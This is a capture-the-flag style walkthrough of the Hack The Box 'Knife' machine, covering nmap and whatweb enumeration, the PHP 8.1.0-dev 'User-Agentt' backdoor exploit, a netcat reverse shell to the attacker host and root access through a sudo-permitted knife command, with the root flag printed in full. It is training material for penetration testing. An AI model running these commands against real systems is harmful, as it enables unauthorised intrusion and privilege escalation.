@@ -1,0 +1,164 @@
+#+TITLE: Knife write up
+#+AUTHOR: Wordir
+
+** Introduction:
+*Knife* is an easy linux machine of hack the box, Below is the guide on how to exploit it.
+
+
+* Enumeration
+
+
+First we will use the *ping* command to see if the target host responds to us:
+
+#+begin_bash bash
+ping 10.10.10.242   
+PING 10.10.10.242 (10.10.10.242) 56(84) bytes of data.
+64 bytes from 10.10.10.242: icmp_seq=1 ttl=63 time=42.2 ms
+64 bytes from 10.10.10.242: icmp_seq=2 ttl=63 time=41.9 ms
+64 bytes from 10.10.10.242: icmp_seq=3 ttl=63 time=42.0 ms
+#+end_bash
+
+
+yep, now it's time to run an *nmap* scan on our target to see what ports it has open
+
+
+** nmap:
+
+we perform a pretty basic scan with *nmap*
+
+
+#+begin_bash bash
+sudo nmap -sC -sV -O  10.10.10.242
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 07:29 EDT
+Nmap scan report for 10.10.10.242
+Host is up (0.043s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
+|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
+|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title:  Emergent Medical Idea
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=3/29%OT=22%CT=1%CU=38587%PV=Y%DS=2%DC=I%G=Y%TM=6606
+OS:A630%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)
+OS:OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53C
+OS:ST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
+OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
+OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
+OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
+OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
+OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
+OS:%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.08 seconds
+#+end_bash
+
+
+as we can see we have port 80(http) and port 22(ssh), let's start with the enumeration of *port 80*
+
+** http://10.10.10.242:
+
+taking a look at the web page itself, it appears to be a *static page*, nothing is interactable,
+also the code doesn't seem to be anything special.
+
+so now it' time to use *whatweb* an open source web technology discovery tool designed
+to gather information about a website by analyzing its HTTP responses.
+
+#+begin_bash bash  
+whatweb http://10.10.10.242/
+http://10.10.10.242/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)],
+IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
+#+end_bash
+
+php version seems to look old, so we must search some CVE about this version
+and infact we found a CVE in exploit database:
+
+*PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution*
+
+now a quick explain , this *Poc* use a vulnerability, known as 'zerodiumvar_dump', allows for the execution of arbitrary PHP code.
+It is important to note that this module specifically targets the PHP 8.1.0-dev version.
+this work with maliciously crafted GET requests , by sending command in the user agent header
+
+and here we go, we got a pseudo shell, and now it's time to get a real reverse shell:
+
+* Exploit
+
+#+begin_bash bash
+./exp.py 
+Enter the full host url:
+http://10.10.10.242/
+
+Interactive shell is opened on http://10.10.10.242/ 
+Can't acces tty; job crontol turned off.
+$ ls
+bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+
+$ busybox nc 10.10.14.17 4444 -e sh
+#+end_bash
+
+** User flag
+
+#+begin_bash bash
+(remote) james@knife:/home/james$ cat user.txt 
+abe228c25********************
+
+#+end_bash
+
+
+** Privilage escalation
+
+once inside we first execute the command *sudo -l* , if it doesn't ask for the current user's password,
+we will be able to see if we have any root permissions
+
+#+begin_bash bash
+User james may run the following commands on knife:
+    (root) NOPASSWD: /usr/bin/knife
+#+end_bash
+
+
+Let's do a quick search to see if there is any privilege escalation that exploits access to this command, and yep:
+
+#+begin_bash bash
+remote) james@knife:/home/james$ sudo knife exec -E 'exec "/bin/sh"'
+\[\](remote)\[\] \[\]root@knife\[\]:\[\]/home/james\[\]$ whoami
+root
+\[\](remote)\[\] \[\]root@knife\[\]:\[\]/home/james\[\]$ cd /root
+\[\](remote)\[\] \[\]root@knife\[\]:\[\]/root\[\]$ cat root.txt
+0ff1ce3c4e1f2ee9dd4ce9798ad55aec
+\[\](remote)\[\] \[\]root@knife\[\]:\[\]/root\[\]$ 
+#+end_bash
+
+
+we got the root flag
